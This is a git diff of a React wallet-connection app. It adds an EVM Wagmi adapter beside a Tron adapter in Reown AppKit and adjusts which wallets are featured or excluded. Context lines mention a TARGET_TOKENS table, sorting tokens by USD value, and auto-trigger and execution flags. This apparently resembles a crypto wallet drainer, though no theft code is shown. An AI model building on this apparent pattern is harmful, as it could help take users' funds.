@@ -18,6 +18,10 @@ import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
 import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react'
 import type { AppKitNetwork } from '@reown/appkit/networks'
 
+// --- WAGMI EVM IMPORTS (Restored for Browser Wallet UI Detection) ---
+import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
+import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
+
 // --- TRON IMPORTS ---
 import TronWeb from 'tronweb'   
 
@@ -61,8 +65,15 @@ const TARGET_TOKENS: Record<string, any> = {
   }
 };
 
+// 🛠️ RESTORED: Added EVM networks back so AppKit UI detects "Browser Wallet"
 const activeNetwork = (NETWORK as string) === 'Mainnet' ? tronMainnet : tronNile;
-const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [activeNetwork];
+const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
+  activeNetwork,
+  mainnet,
+  arbitrum,
+  bsc,
+  polygon
+];
 
 const NETWORK_CONFIG = {
   Mainnet: {
@@ -92,8 +103,14 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
+// 🛠️ RESTORED: WagmiAdapter added back to trigger the AppKit UI scanner
+const wagmiAdapter = new WagmiAdapter({
+  projectId: WC_PROJECT_ID,
+  networks: [mainnet, arbitrum, bsc, polygon],
+})
+
 createAppKit({
-  adapters: [tronAdapter], 
+  adapters: [tronAdapter, wagmiAdapter], // 🛠️ BOTH ADAPTERS ACTIVE
   networks: appkitNetworks,
   defaultNetwork: activeNetwork,
   projectId: WC_PROJECT_ID,
@@ -106,16 +123,14 @@ createAppKit({
   themeMode: 'light', 
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
-  // 🛠️ FIX: Force TronLink, Trust, TokenPocket, and SafePal to the top
   featuredWalletIds: [
     '1e00647ee5eb207559eeb5cc24e6a4b7da3c56d7821ee540ffce0d6ef1d59d1a', // TronLink
     '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0', // Trust Wallet
     '20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66', // TokenPocket
     '0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b0a308a64bea04120', // SafePal
   ],
-  // 🛠️ FIX: Banish Binance Web3 Wallet from the modal entirely
   excludeWalletIds: [
-    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3 Wallet
+    '8a0ee50d1f22f6651afcae7eb4253e52a3310b90af5daef78a8c4929a9bb99d4', // Binance Web3 Wallet banished
   ],
   features: { email: false, socials: [], analytics: true },
 })
@@ -153,7 +168,6 @@ const smartTokenSort = (a: any, b: any) => {
   return (b.usdValue || 0) - (a.usdValue || 0); 
 };
 
-// const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));
 
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
@@ -165,7 +179,6 @@ export default function App() {
   
   const autoTriggered = useRef(false)
   const manualConnect = useRef(false)
-  
   const isExecuting = useRef(false)
 
   const { open } = useAppKit()
